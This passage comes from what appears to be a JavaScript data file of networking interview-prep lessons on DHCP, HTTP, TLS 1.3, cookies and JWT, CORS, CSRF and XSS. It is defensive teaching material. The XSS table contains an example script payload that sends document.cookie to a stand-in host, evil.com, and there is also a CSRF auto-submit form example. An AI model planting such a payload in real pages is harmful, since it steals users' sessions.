        { p: "A new device has no IP, doesn't know the subnet, gateway or DNS server. <b>DHCP</b> (Dynamic Host Configuration Protocol, UDP, server port <b>67</b>, client port <b>68</b>) hands all of that out as a time-limited <b>lease</b>." },
        { svg: `<svg viewBox="0 0 680 240" width="680" class="dg">
  <text class="tx tx-b" x="170" y="20" text-anchor="middle" dominant-baseline="middle">Client (no IP yet)</text>
  <text class="tx tx-b" x="510" y="20" text-anchor="middle" dominant-baseline="middle">DHCP server</text>
  <line class="ln ln-d" x1="170" y1="35" x2="170" y2="225"/>
  <line class="ln ln-d" x1="510" y1="35" x2="510" y2="225"/>
  <line class="ln-a" x1="170" y1="55" x2="508" y2="80" marker-end="url(#dg-arr-a)"/>
  <text class="tx tx-c" x="340" y="58" text-anchor="middle">D: DISCOVER  0.0.0.0 → 255.255.255.255</text>
  <line class="ln-a" x1="510" y1="100" x2="172" y2="125" marker-end="url(#dg-arr-a)"/>
  <text class="tx tx-c" x="340" y="103" text-anchor="middle">O: OFFER  192.168.1.23, lease 24h</text>
  <line class="ln-a" x1="170" y1="145" x2="508" y2="170" marker-end="url(#dg-arr-a)"/>
  <text class="tx tx-c" x="340" y="148" text-anchor="middle">R: REQUEST  I'll take .23 (broadcast)</text>
  <line class="ln-a" x1="510" y1="190" x2="172" y2="215" marker-end="url(#dg-arr-a)"/>
  <text class="tx tx-c" x="340" y="193" text-anchor="middle">A: ACK  mask, gateway, DNS, lease</text>
</svg>`, caption: "Discover and Request are broadcast because the client has no address yet (and Request tells any other offering servers they lost)." },
        { table: { head: ["Step", "Sent by", "Addressing", "Content"], rows: [
          ["Discover", "Client", "src 0.0.0.0:68 → dst 255.255.255.255:67 (broadcast)", "'Any DHCP server out there?' + client MAC"],
          ["Offer", "Server(s)", "to client MAC (broadcast or unicast)", "Proposed IP, mask, lease time, server id"],
          ["Request", "Client", "broadcast", "'I accept the offer from server X' (others withdraw theirs)"],
          ["Ack", "Chosen server", "to client", "Confirms IP + options: subnet mask, default gateway, DNS servers, lease"]
        ] } },
        { ul: [
          "Before using the IP the client may ARP for it to make sure no one else has it (conflict detection).",
          "Renewal: at <b>T1 = 50%</b> of the lease the client unicasts a Request to renew; at <b>T2 = 87.5%</b> it broadcasts to any server. NAK → start DORA again.",
          "Broadcasts don't cross routers, so a router can act as a <b>DHCP relay agent</b> (ip helper-address) forwarding to a central server.",
          "No DHCP reply → Windows/macOS self-assign <b>169.254.x.x</b> (APIPA) — 'limited connectivity'.",
          "<b>Rogue DHCP server</b> attack hands out a malicious gateway/DNS; switches defend with DHCP snooping."
        ] },
        { tip: "Link the protocols in one story: DHCP gives you your IP, mask, gateway and DNS server → ARP finds the gateway's MAC → DNS resolves names → NAT at the router lets your private IP reach the Internet. That chain shows real understanding." }
      ] }
    ],
    practice: [
      { q: "Why can't www.example.com have a CNAME and an MX record at the same time? Why can't example.com (the apex) be a CNAME?", a: "A CNAME says 'this name is exactly that other name' so no other record type may coexist on the same name. The zone apex must have SOA and NS records, so it can't be a CNAME (providers offer ALIAS/ANAME 'flattening' as a workaround)." },
      { q: "Your laptop shows IP 169.254.13.7. What went wrong?", a: "DHCP failed — no Offer/Ack received (server down, cable/Wi-Fi association issue, relay misconfigured), so the OS self-assigned an APIPA link-local address. It can only talk to other hosts on the same link; no gateway, no Internet." },
      { q: "How many DNS queries does the resolver make for mail.google.com with a cold cache? With a warm cache that already knows the .com and google.com NS records?", a: "Cold: 3 iterative queries — root, .com TLD, google.com authoritative (possibly more if a CNAME points to another domain). Warm: 1 — straight to google.com's authoritative server. If mail.google.com's own record is still cached: 0." },
      { q: "Home router public IP 49.36.12.7. Two phones inside both open connections from port 40000 to the same server 1.2.3.4:443. How does the reply reach the right phone?", a: "PAT gives each flow a different public source port, e.g. 49.36.12.7:61001 and 49.36.12.7:61002, and records (private IP:port ↔ public port) in its translation table. Replies arrive at 49.36.12.7:61001 or :61002 and are rewritten back to the right private IP:40000." },
      { q: "Why are DHCP Discover and Request broadcast, and which ports do they use?", a: "Discover: the client has no IP and doesn't know the server's address, so it broadcasts from 0.0.0.0:68 to 255.255.255.255:67. Request: broadcast so that every server that made an Offer learns which one was accepted and can release its reserved address." }
    ],
    related: ["cn:nat", "cn:dns-records", "cn:dns-resolution", "cn:dhcp", "cn:private-ip", "cn:arp-rarp", "cn:ports-well-known", "cn:cdn", "cn:network-attacks"]
  });

  /* ------------------------------------------------------------------ */
  /* D32 (part 1) — HTTP methods, status codes, versions                  */
  /* ------------------------------------------------------------------ */
  add({
    id: "cn-http",
    subject: "cn",
    title: "HTTP methods, status codes, idempotency & HTTP/1.1 vs 2 vs 3",
    minutes: 55,
    crux: [
      "<b>Safe</b> = doesn't change server state (GET, HEAD, OPTIONS). <b>Idempotent</b> = doing it N times leaves the same state as once (all safe methods + PUT, DELETE). <b>POST</b> is neither; PATCH isn't guaranteed idempotent.",
      "Status classes: <b>1xx</b> info, <b>2xx</b> success, <b>3xx</b> redirect, <b>4xx</b> client error, <b>5xx</b> server error.",
      "Must-know codes: 200, 201, 204, 301, 302, 304, 400, <b>401 (not authenticated)</b> vs <b>403 (authenticated but not allowed)</b>, 404, 409, 429, 500, 502, 503, 504.",
      "<b>HTTP/1.1</b>: text, persistent connections, one request at a time per connection (head-of-line blocking). <b>HTTP/2</b>: binary frames, many streams multiplexed on one TCP connection, HPACK header compression. <b>HTTP/3</b>: HTTP/2 ideas over <b>QUIC (UDP)</b> — no TCP head-of-line blocking, 1-RTT/0-RTT setup, connection migration."
    ],
    sections: [
      { h: "Anatomy of an HTTP message", blocks: [
        { code: `GET /api/users/42 HTTP/1.1
Host: api.shop.in
Accept: application/json
Authorization: Bearer eyJhbGciOi...
Cookie: sid=9f8a7c

HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 38
Cache-Control: max-age=60
ETag: "v7"

{"id":42,"name":"Asha","city":"Pune"}`, lang: "text", title: "Request (method, path, version, headers, blank line, body) and response (status line, headers, body)" },
        { p: "HTTP is <b>stateless</b>: each request carries everything the server needs (cookies/tokens supply the 'who am I'). Headers are case-insensitive; a blank line separates headers from the body." }
      ] },
      { h: "Methods, safety and idempotency", blocks: [
        { table: { head: ["Method", "Meaning", "Body", "Safe", "Idempotent", "Typical response"], rows: [
          ["GET", "Read a resource", "No", "Yes", "Yes", "200"],
          ["HEAD", "GET without body (headers only)", "No", "Yes", "Yes", "200"],
          ["OPTIONS", "Which methods are allowed? (CORS preflight)", "No", "Yes", "Yes", "204 / 200"],
          ["POST", "Create / process (server picks the id)", "Yes", "No", "<b>No</b>", "201 Created + Location"],
          ["PUT", "Create or <b>replace</b> the whole resource at this URI", "Yes", "No", "Yes", "200 / 204 / 201"],
          ["PATCH", "Partial update", "Yes", "No", "Not guaranteed", "200 / 204"],
          ["DELETE", "Remove", "Optional", "No", "Yes", "204 / 200 (then 404)"]
        ] } },
        { ul: [
          "Idempotency is about <b>server state</b>, not the response. DELETE /orders/7 twice: first 204, second 404 — but the state (order 7 gone) is identical, so DELETE is idempotent.",
          "PUT <code>{\"qty\":3}</code> twice → qty is 3. POST /orders twice → <b>two orders</b>. PATCH <code>{\"op\":\"increment\"}</code> twice → +2, so PATCH is not idempotent in general (PATCH <code>{\"qty\":3}</code> happens to be).",
          "Why it matters: clients, proxies and load balancers can <b>safely retry</b> idempotent requests after a timeout. For POSTs that must not repeat (payments), APIs accept an <b>Idempotency-Key</b> header and store the result per key — Razorpay/Stripe do this.",
          "Safe methods can be cached and prefetched; never make a GET that deletes something (crawlers will follow it)."
        ] }
      ] },
      { h: "Status codes", blocks: [
        { table: { head: ["Code", "Name", "When"], rows: [
          ["100", "Continue", "Server OK with headers; send the (large) body"],
          ["101", "Switching Protocols", "Upgrade to WebSocket"],
          ["200", "OK", "Success with body"],
          ["201", "Created", "POST/PUT created a resource (Location header points to it)"],
          ["202", "Accepted", "Queued for async processing"],
          ["204", "No Content", "Success, no body (DELETE, preflight)"],
          ["206", "Partial Content", "Range request (video seek, resumable download)"],
          ["301", "Moved Permanently", "URL changed forever; browsers and search engines update (may turn POST into GET)"],
          ["302", "Found", "Temporary redirect (e.g. after login)"],
          ["304", "Not Modified", "Conditional GET: your cached copy (ETag / Last-Modified) is still valid — no body"],
          ["307 / 308", "Temporary / Permanent Redirect", "Like 302 / 301 but the method and body must be kept"],
          ["400", "Bad Request", "Malformed JSON, validation failed"],
          ["401", "Unauthorized", "Not <b>authenticated</b> — missing/invalid credentials (send WWW-Authenticate)"],
          ["403", "Forbidden", "Authenticated but not <b>authorised</b>"],
          ["404", "Not Found", "No such resource (also used to hide existence)"],
          ["405", "Method Not Allowed", "e.g. DELETE on a read-only resource"],
          ["409", "Conflict", "Version conflict, duplicate username"],
          ["422", "Unprocessable Content", "Syntax OK but semantically invalid"],
          ["429", "Too Many Requests", "Rate limited (Retry-After header)"],
          ["500", "Internal Server Error", "Unhandled exception"],
          ["502", "Bad Gateway", "Proxy/LB got an invalid response from upstream (app crashed)"],
          ["503", "Service Unavailable", "Overloaded / maintenance (Retry-After)"],
          ["504", "Gateway Timeout", "Proxy/LB timed out waiting for upstream"]
        ] } },
        { warn: "401 vs 403 is the #1 trap: 401 = 'who are you?' (log in), 403 = 'I know who you are, and no'. And 502 vs 504: upstream answered badly (or refused) vs upstream didn't answer in time." }
      ] },
      { h: "HTTP/1.0 → 1.1 → 2 → 3", blocks: [
        { table: { head: ["", "HTTP/1.1 (1997)", "HTTP/2 (2015)", "HTTP/3 (2022)"], rows: [
          ["Transport", "TCP (+ TLS)", "TCP + TLS (h2)", "<b>QUIC over UDP</b>, TLS 1.3 built in"],
          ["Format", "Text", "Binary frames", "Binary frames"],
          ["Concurrency", "One outstanding request per connection; browsers open ~6 connections per host", "Many <b>streams multiplexed</b> on one connection", "Independent streams in QUIC"],
          ["Head-of-line blocking", "At HTTP level (response 2 waits for response 1)", "Solved at HTTP level, but one lost TCP packet stalls <b>all</b> streams", "Solved — a loss stalls only its own stream"],
          ["Headers", "Repeated plain text", "HPACK compression", "QPACK compression"],
          ["Setup cost (new, with TLS 1.3)", "TCP 1 RTT + TLS 1 RTT", "TCP 1 RTT + TLS 1 RTT", "1 RTT (0-RTT on resumption)"],
          ["Other", "Keep-alive default, Host header required, chunked encoding", "Stream priorities, server push (now deprecated)", "Connection migration (Wi-Fi → 4G keeps the connection via connection IDs)"]
        ] } },
        { p: "HTTP/1.0 opened a new TCP connection for every request; 1.1 made connections persistent. Pipelining existed in 1.1 but responses still had to come back in order, so it was effectively unused." },
        { code: `import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.time.Duration;

public class HttpDemo {
    public static void main(String[] args) throws Exception {
        HttpClient client = HttpClient.newBuilder()
                .version(HttpClient.Version.HTTP_2)          // tries h2 via TLS ALPN, falls back to 1.1
                .followRedirects(HttpClient.Redirect.NORMAL)  // follow 301/302/307/308 (not https -> http)
                .connectTimeout(Duration.ofSeconds(5))
                .build();

        HttpRequest req = HttpRequest.newBuilder(URI.create("https://example.com/"))
                .header("Accept", "text/html")
                .GET()                                        // safe + idempotent
                .build();

        HttpResponse<String> res = client.send(req, HttpResponse.BodyHandlers.ofString());
        System.out.println("status  = " + res.statusCode());   // e.g. 200
        System.out.println("version = " + res.version());      // HTTP_2 or HTTP_1_1
        System.out.println("type    = " + res.headers().firstValue("content-type").orElse("?"));
        System.out.println("bytes   = " + res.body().length());
    }
}`, lang: "java", title: "java.net.http.HttpClient (Java 11+) — prints status 200 and version HTTP_2" },
        { tip: "If asked 'why is HTTP/3 on UDP?': TCP lives in the OS kernel and middleboxes and is practically impossible to change; building QUIC on UDP in user space let Google/IETF fix head-of-line blocking and handshake latency and ship it inside browsers." }
      ] }
    ],
    practice: [
      { q: "A client sends POST /payments, the network times out before a response. Is it safe to retry? How do real APIs make it safe?", a: "Not by default — POST isn't idempotent, so the payment might have gone through and a retry would charge twice. APIs require an <b>Idempotency-Key</b> (unique per logical operation); the server stores key → result and returns the stored result for a repeat instead of executing again." },
      { q: "Which status code: (a) wrong password, (b) logged-in user opens admin page, (c) signup with an existing email, (d) Nginx can't reach the Spring Boot app, (e) Nginx waited 60 s and gave up, (f) cached image still fresh on revalidation.", a: "(a) 401. (b) 403. (c) 409 Conflict (422 also defensible). (d) 502 Bad Gateway. (e) 504 Gateway Timeout. (f) 304 Not Modified." },
      { q: "Is DELETE idempotent if the second call returns 404?", a: "Yes. Idempotency is defined on the resulting server state — after one or many DELETEs the resource is gone. The status code can differ." },
      { q: "A page loads 60 small images over HTTPS. Compare what happens on HTTP/1.1 and HTTP/2.", a: "HTTP/1.1: the browser opens up to ~6 TCP+TLS connections to the host and fetches ~6 images at a time, each connection waiting for its current response (HOL blocking), so ~10 sequential rounds plus 6 handshakes. HTTP/2: one TCP+TLS connection, all 60 requests sent at once as separate streams with compressed headers, responses interleaved — far fewer round trips. A single lost TCP packet, however, stalls all 60 streams until it's retransmitted (HTTP/3 fixes that)." }
    ],
    related: ["cn:http-methods", "cn:http-status-codes", "cn:rest-api", "cn:http-versions", "cn:http-vs-https", "cn:websocket-vs-polling", "cn:proxy-vs-reverse-proxy", "cn:load-balancer", "cn:cdn"]
  });

  /* ------------------------------------------------------------------ */
  /* D32 (part 2) — HTTPS/TLS, cookies/sessions/JWT, CORS, CSRF, XSS      */
  /* ------------------------------------------------------------------ */
  add({
    id: "cn-web-security",
    subject: "cn",
    title: "HTTPS & TLS 1.3, cookies vs sessions vs JWT, CORS, CSRF, XSS",
    minutes: 60,
    crux: [
      "<b>HTTPS = HTTP over TLS</b>: confidentiality (encryption), integrity (MAC/AEAD), authentication (server certificate signed by a trusted CA). Port 443.",
      "TLS uses <b>asymmetric crypto</b> only to authenticate and agree on a key (ECDHE), then <b>symmetric</b> (AES-GCM / ChaCha20) for bulk data. TLS 1.3 = <b>1 RTT</b> (0-RTT on resumption), always forward secret.",
      "<b>Session</b>: server stores state, browser holds an opaque id in a cookie. <b>JWT</b>: signed (not encrypted!) self-contained token; stateless but hard to revoke.",
      "<b>CORS</b> is the browser relaxing the same-origin policy when the server opts in with <code>Access-Control-Allow-*</code> headers; non-simple requests get an <b>OPTIONS preflight</b>.",
      "<b>CSRF</b> = another site makes your browser send an authenticated request → SameSite cookies + CSRF tokens. <b>XSS</b> = attacker's script runs in your page → output encoding, CSP, HttpOnly cookies."
    ],
    sections: [
      { h: "HTTPS and the TLS 1.3 handshake", blocks: [
        { p: "Plain HTTP can be read and modified by anyone on the path (café Wi-Fi, ISP). TLS adds three guarantees: <b>confidentiality</b>, <b>integrity</b>, and <b>authentication</b> of the server (and optionally the client — mTLS)." },
        { svg: `<svg viewBox="0 0 680 270" width="680" class="dg">
  <text class="tx tx-b" x="150" y="20" text-anchor="middle" dominant-baseline="middle">Browser</text>
  <text class="tx tx-b" x="530" y="20" text-anchor="middle" dominant-baseline="middle">Server</text>
  <line class="ln ln-d" x1="150" y1="35" x2="150" y2="255"/>
  <line class="ln ln-d" x1="530" y1="35" x2="530" y2="255"/>
  <text class="tx-m" x="340" y="44" text-anchor="middle">(TCP 3-way handshake already done)</text>
  <line class="ln-a" x1="150" y1="65" x2="528" y2="90" marker-end="url(#dg-arr-a)"/>
  <text class="tx tx-c" x="340" y="68" text-anchor="middle">ClientHello: ciphers, key_share, SNI, ALPN</text>
  <line class="ln-a" x1="530" y1="110" x2="152" y2="135" marker-end="url(#dg-arr-a)"/>
  <text class="tx tx-c" x="340" y="112" text-anchor="middle">ServerHello: key_share</text>
  <text class="tx tx-c" x="340" y="148" text-anchor="middle">{Certificate, CertificateVerify, Finished}</text>
  <line class="ln-a" x1="150" y1="170" x2="528" y2="195" marker-end="url(#dg-arr-a)"/>
  <text class="tx tx-c" x="340" y="173" text-anchor="middle">{Finished} + GET / (encrypted)</text>
  <line class="ln-a" x1="530" y1="215" x2="152" y2="240" marker-end="url(#dg-arr-a)"/>
  <text class="tx tx-c" x="340" y="218" text-anchor="middle">200 OK (encrypted)</text>
  <text class="tx-m" x="140" y="135" text-anchor="end">keys derived</text>
  <text class="tx-m" x="540" y="100">keys derived</text>
</svg>`, caption: "TLS 1.3: one round trip. Messages in {braces} are already encrypted with handshake keys." },
        { ol: [
          "<b>ClientHello</b>: TLS versions, cipher suites (e.g. TLS_AES_128_GCM_SHA256), a <b>key share</b> (client's ephemeral ECDHE public key, e.g. X25519), <b>SNI</b> (which hostname — one IP can host many sites) and <b>ALPN</b> (h2 or http/1.1), plus a random nonce.",
          "<b>ServerHello</b>: chosen cipher and the server's key share. Now both sides compute the same shared secret with Diffie-Hellman — it never crossed the wire — and derive handshake keys.",
          "Encrypted: <b>Certificate</b> (server's public key + domain, signed by a CA), <b>CertificateVerify</b> (signature over the handshake transcript with the server's private key — proves it owns the certificate), <b>Finished</b> (MAC over the transcript — proves nothing was tampered with).",
          "Browser validates the certificate: chain up to a root CA in its trust store, hostname matches (SAN), not expired, not revoked. Then it sends <b>Finished</b> and can send the HTTP request immediately.",
          "All application data uses symmetric AEAD (AES-GCM / ChaCha20-Poly1305) with the derived session keys."
        ] },
        { table: { head: ["", "TLS 1.2", "TLS 1.3"], rows: [
          ["Full handshake", "2 RTT", "1 RTT"],
          ["Resumption", "1 RTT (session id / ticket)", "0-RTT possible (PSK) — early data is replayable, use only for idempotent requests"],
          ["Key exchange", "RSA key transport or (EC)DHE", "Only ephemeral (EC)DHE → <b>forward secrecy</b> always"],
          ["Ciphers", "Many, incl. weak CBC/RC4", "5 AEAD suites only"],
          ["Certificate", "Sent in clear", "Encrypted"]
        ] } },
        { ul: [
          "<b>Why not only asymmetric?</b> RSA/ECC are ~1000× slower than AES; they're used only to authenticate and agree on a key.",
          "<b>Forward secrecy</b>: session keys come from ephemeral DH keys thrown away after the handshake, so stealing the server's private key later cannot decrypt recorded traffic.",
          "<b>MITM</b>: an attacker can't present a valid certificate for google.com without a CA's signature — that's what the certificate chain is for. <b>HSTS</b> stops SSL-stripping by forcing HTTPS."
        ] }
      ] },
      { h: "Cookies vs sessions vs JWT", blocks: [
        { p: "HTTP is stateless, so after login the server needs a way to recognise the next request. A <b>cookie</b> is just the browser's storage + automatic sending mechanism; <b>sessions</b> and <b>JWTs</b> are two strategies for what to put in it (or in an <code>Authorization</code> header)." },
        { table: { head: ["", "Server-side session", "JWT (stateless token)"], rows: [
          ["What the client holds", "Random opaque id: <code>sid=9f8a7c…</code>", "<code>header.payload.signature</code> (base64url JSON, signed with HMAC or RSA/ECDSA)"],
          ["Where state lives", "Server store (memory, Redis, DB)", "Inside the token (user id, roles, exp)"],
          ["Verification", "Look up sid in the store", "Verify signature + <code>exp</code>; no lookup"],
          ["Logout / revoke", "Delete the session — instant", "Hard: token valid until expiry → short-lived access token + refresh token, or a deny-list"],
          ["Scaling", "Needs shared store (Redis) or sticky sessions", "Any server with the key can verify — good for microservices"],
          ["Size", "Tiny", "Hundreds of bytes on every request"],
          ["Typical transport", "Cookie (HttpOnly, Secure, SameSite)", "Authorization: Bearer header (or HttpOnly cookie)"]
        ] } },
        { code: `Set-Cookie: sid=9f8a7c21; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=3600

HttpOnly   -> JavaScript cannot read it (document.cookie) -> limits XSS token theft
Secure     -> only sent over HTTPS
SameSite   -> Strict: never sent on cross-site requests
              Lax:    sent on top-level GET navigations only (browser default in Chrome)
              None:   always sent cross-site (must also be Secure)
Max-Age / Expires -> persistent cookie; without them it is a session cookie`, lang: "text", title: "Cookie attributes you must know" },
        { warn: "A JWT is <b>signed, not encrypted</b> — anyone can base64-decode the payload. Never put passwords or PII in it. Also reject <code>alg: none</code> and pin the expected algorithm when verifying." }
      ] },
      { h: "Same-origin policy and CORS", blocks: [
        { p: "<b>Origin</b> = scheme + host + port. <code>https://shop.in</code> and <code>https://api.shop.in</code> are different origins; so are <code>http://</code> vs <code>https://</code> and port 443 vs 8443. The <b>same-origin policy</b> stops JavaScript on one origin from <i>reading</i> responses from another. <b>CORS</b> is how a server says 'these other origins may read my responses'." },
        { ul: [
          "<b>Simple request</b> (no preflight): GET, HEAD or POST with only safe headers and Content-Type one of <code>text/plain</code>, <code>multipart/form-data</code>, <code>application/x-www-form-urlencoded</code>. Browser sends it with an <code>Origin</code> header; if the response lacks a matching <code>Access-Control-Allow-Origin</code>, JS just can't read it.",
          "<b>Preflighted request</b>: anything else — PUT/DELETE/PATCH, <code>Content-Type: application/json</code>, custom headers like <code>Authorization</code>. The browser first sends <b>OPTIONS</b>, and only sends the real request if the server approves."
        ] },
        { code: `OPTIONS /api/cart HTTP/1.1
Origin: https://shop.in
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: content-type, authorization

HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://shop.in
Access-Control-Allow-Methods: GET, PUT, DELETE
Access-Control-Allow-Headers: content-type, authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 600

(now the browser sends the real PUT, whose response must again carry Access-Control-Allow-Origin)`, lang: "text", title: "Preflight exchange between https://shop.in and https://api.shop.in" },
        { warn: "CORS is enforced <b>by the browser</b>, not the server — curl/Postman ignore it, so CORS is not an authentication mechanism. <code>Access-Control-Allow-Origin: *</code> cannot be combined with credentials (cookies); you must echo a specific allowed origin." }
      ] },
      { h: "CSRF and XSS", blocks: [
        { table: { head: ["", "CSRF (Cross-Site Request Forgery)", "XSS (Cross-Site Scripting)"], rows: [
          ["Idea", "Evil site makes <b>your browser</b> send a request to bank.com; the browser attaches your bank cookies automatically", "Attacker gets <b>their JavaScript</b> to run inside the victim site's page"],
          ["Example", "<code>&lt;form action=\"https://bank.com/transfer\" method=\"POST\"&gt;</code> auto-submitted from evil.com", "Comment <code>&lt;script&gt;fetch('https://evil.com?c='+document.cookie)&lt;/script&gt;</code> saved and shown to every visitor"],
          ["Attacker can", "Trigger state changes, cannot read the response", "Do anything the user can: read the page, steal tokens, call APIs"],
          ["Relies on", "Cookies sent automatically", "Unescaped user input rendered as HTML/JS"],
          ["Defences", "<b>SameSite</b>=Lax/Strict cookies; <b>CSRF token</b> (random per-session value in a hidden field / header the evil site can't read); check <code>Origin</code>/<code>Referer</code>; never change state on GET; Bearer tokens in headers aren't auto-sent", "<b>Context-aware output encoding</b> (&lt; → &amp;lt;); template engines that auto-escape; sanitise rich HTML (allow-list); <b>Content-Security-Policy</b> (no inline scripts); <b>HttpOnly</b> cookies so script can't steal them"]
        ] } },
        { ul: [
          "XSS types: <b>stored</b> (saved in DB, hits every viewer), <b>reflected</b> (in a crafted URL parameter echoed back), <b>DOM-based</b> (client JS writes untrusted data via <code>innerHTML</code>).",
          "XSS defeats CSRF tokens (script can read the token from the page), so fix XSS first.",
          "Related server-side cousin: <b>SQL injection</b> → prepared statements (<code>PreparedStatement</code> in JDBC), never string concatenation."
        ] },
        { tip: "Crisp one-liners: 'CSRF abuses the site's trust in the user's browser; XSS abuses the user's trust in the site.' 'CORS controls who can <i>read</i> a response; it does not stop a cross-site <i>request</i> from being sent — that's CSRF's job.'" }
      ] }
    ],
    practice: [
      { q: "In TLS 1.3, how do client and server end up with the same secret key if it is never sent?", a: "Ephemeral Diffie-Hellman (ECDHE): each side sends only its public key share; each combines its own private value with the other's public share and gets the same shared secret. An eavesdropper sees both public shares but can't compute the secret (discrete-log problem). The certificate + CertificateVerify signature prove the server's share really came from the owner of google.com." },
      { q: "Frontend at https://app.shop.in calls fetch('https://api.shop.in/cart', {method:'DELETE', credentials:'include'}). List the headers the API must return for this to work.", a: "Preflight (OPTIONS) response: Access-Control-Allow-Origin: https://app.shop.in (not *, because credentials), Access-Control-Allow-Methods including DELETE, Access-Control-Allow-Credentials: true (and Allow-Headers if custom headers are sent). The actual DELETE response must again include Access-Control-Allow-Origin: https://app.shop.in and Access-Control-Allow-Credentials: true." },
      { q: "Your app stores the JWT in localStorage. Which attack does that expose it to, and what's the alternative trade-off?", a: "XSS — any injected script can read localStorage and exfiltrate the token. Storing it in an HttpOnly, Secure cookie hides it from JS, but cookies are sent automatically, so you must now defend against CSRF (SameSite + CSRF token). Either way, short token lifetimes limit damage." },
      { q: "A user logs out but their JWT has 50 minutes left. What are your options?", a: "(1) Keep access tokens short-lived (5–15 min) and revoke the refresh token server-side on logout. (2) Maintain a deny-list of revoked token ids (jti) checked on each request (reintroduces state, often in Redis). (3) Rotate the signing key (logs everyone out). Sessions don't have this problem — deleting the session is instant." },
      { q: "Does enabling CORS on your API protect it from CSRF?", a: "No. CORS only decides whether browser JS may read the response. A cross-site form POST (a 'simple' request) is still sent with cookies and executed. CSRF needs SameSite cookies / CSRF tokens / Origin checks." }
    ],
    related: ["cn:http-vs-https", "cn:tls-handshake", "cn:symmetric-vs-asymmetric", "cn:digital-signatures-certificates", "cn:cookies-sessions-tokens", "cn:network-attacks", "cn:hashing", "cn:firewall"]
  });

  /* ------------------------------------------------------------------ */
  /* D53 / D54 — rapid-fire revision                                      */
  /* ------------------------------------------------------------------ */
  add({
    id: "cn-rapid-fire",
    subject: "cn",
    title: "CN rapid-fire revision — 40 one-line answers",
    minutes: 30,
    crux: [
      "Revise the <b>URL answer</b> first: parse → DNS (caches, root → TLD → authoritative) → ARP gateway → TCP → TLS → HTTP → NAT/CDN/network → server → response → parse → render.",
      "TCP handshake SYN / SYN-ACK / ACK; teardown FIN / ACK / FIN / ACK; TIME_WAIT 2×MSL on the active closer.",
      "Flow control = receiver's rwnd; congestion control = sender's cwnd; slow start doubles, avoidance +1, loss halves.",
      "Subnet formula: usable = 2<sup>32−n</sup> − 2; block = 256 − mask octet.",
      "401 = not logged in, 403 = not allowed, 502 = bad upstream, 504 = upstream timeout; PUT/DELETE idempotent, POST not."
    ],
    sections: [
      { h: "Layers, addressing, DNS, DHCP", blocks: [
        { table: { head: ["Question", "One-line answer"], rows: [
          ["OSI layers?", "Physical, Data link, Network, Transport, Session, Presentation, Application."],
          ["TCP/IP layers?", "Link, Internet, Transport, Application."],
          ["PDU at L2 / L3 / L4?", "Frame / packet / segment (datagram for UDP)."],
          ["Switch vs router?", "Switch forwards frames by MAC inside a LAN (L2); router forwards packets by IP between networks (L3) and splits broadcast domains."],
          ["MAC vs IP?", "MAC: 48-bit, hardware, local link, changes each hop. IP: 32/128-bit, logical, end-to-end."],
          ["ARP?", "Broadcasts 'who has IP X?' to learn its MAC on the local link; cached in the ARP table."],
          ["Private IP ranges?", "10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16."],
          ["Usable hosts in /27?", "2<sup>5</sup> − 2 = 30."],
          ["Network of 192.168.10.77/26?", "Block 64 → 192.168.10.64, broadcast .127."],
          ["What is CIDR?", "Classless prefixes /n instead of fixed A/B/C; enables efficient allocation and route aggregation."],
          ["NAT / PAT?", "Router rewrites private src IP (and port, for PAT) to its public IP, tracked in a translation table."],
          ["DNS port & transport?", "UDP 53; TCP 53 for large answers and zone transfers."],
          ["A vs CNAME vs MX?", "A: name → IPv4; CNAME: alias → another name; MX: domain → mail server with priority."],
          ["Recursive vs iterative DNS?", "Client asks resolver recursively for the final answer; resolver asks root/TLD/authoritative iteratively, following referrals."],
          ["DHCP steps & ports?", "Discover, Offer, Request, Ack — UDP 67 server, 68 client."],
          ["169.254.x.x means?", "APIPA — DHCP failed."]
        ] } }
      ] },
      { h: "Transport", blocks: [
        { table: { head: ["Question", "One-line answer"], rows: [
          ["TCP vs UDP?", "TCP: connection, reliable, ordered, flow/congestion control, 20 B header. UDP: connectionless, best effort, 8 B header, fast."],
          ["Apps on UDP?", "DNS, DHCP, VoIP, video calls, games, QUIC / HTTP-3."],
          ["3-way handshake?", "SYN(x) → SYN-ACK(y, ack x+1) → ACK(ack y+1)."],
          ["Why not 2-way?", "Server's ISN wouldn't be confirmed and old duplicate SYNs could open bogus connections."],
          ["Why 4-way close?", "Full-duplex: each direction sends its own FIN and gets its own ACK."],
          ["TIME_WAIT?", "Active closer waits 2×MSL so its last ACK can be resent and old segments die out."],
          ["Flow vs congestion control?", "Flow: don't overwhelm the receiver (rwnd). Congestion: don't overwhelm the network (cwnd). Send min of both."],
          ["Slow start?", "cwnd starts small and doubles every RTT until ssthresh, then grows by 1 MSS per RTT."],
          ["On timeout?", "ssthresh = cwnd/2, cwnd = 1, slow start again."],
          ["On 3 duplicate ACKs (Reno)?", "Fast retransmit; ssthresh = cwnd/2; cwnd = ssthresh; continue linearly."],
          ["Go-Back-N vs Selective Repeat?", "GBN resends the lost frame and everything after; SR resends only the lost one (receiver buffers)."],
          ["SYN flood defence?", "SYN cookies — encode state in the ISN, allocate nothing until the final ACK."]
        ] } }
      ] },
      { h: "HTTP and security", blocks: [
        { table: { head: ["Question", "One-line answer"], rows: [
          ["Idempotent methods?", "GET, HEAD, OPTIONS, PUT, DELETE. POST isn't; PATCH not guaranteed."],
          ["PUT vs POST?", "PUT replaces the resource at a known URI (idempotent); POST creates under a collection, server picks id (not idempotent)."],
          ["401 vs 403?", "401 not authenticated; 403 authenticated but not authorised."],
          ["301 vs 302 vs 304?", "Permanent redirect / temporary redirect / cached copy still valid."],
          ["502 vs 503 vs 504?", "Bad response from upstream / server overloaded or down for maintenance / upstream timed out."],
          ["HTTP/2 key idea?", "Binary framing + multiplexed streams over one TCP connection + HPACK."],
          ["HTTP/3 key idea?", "Runs on QUIC over UDP: no TCP head-of-line blocking, 1-RTT/0-RTT, connection migration."],
          ["HTTPS gives?", "Confidentiality, integrity, server authentication (certificate)."],
          ["TLS 1.3 handshake?", "ClientHello (key share, SNI) → ServerHello + cert + verify + finished → client finished: 1 RTT, ECDHE, forward secret."],
          ["Symmetric vs asymmetric in TLS?", "Asymmetric to authenticate and agree the key; symmetric (AES-GCM) for the data because it's fast."],
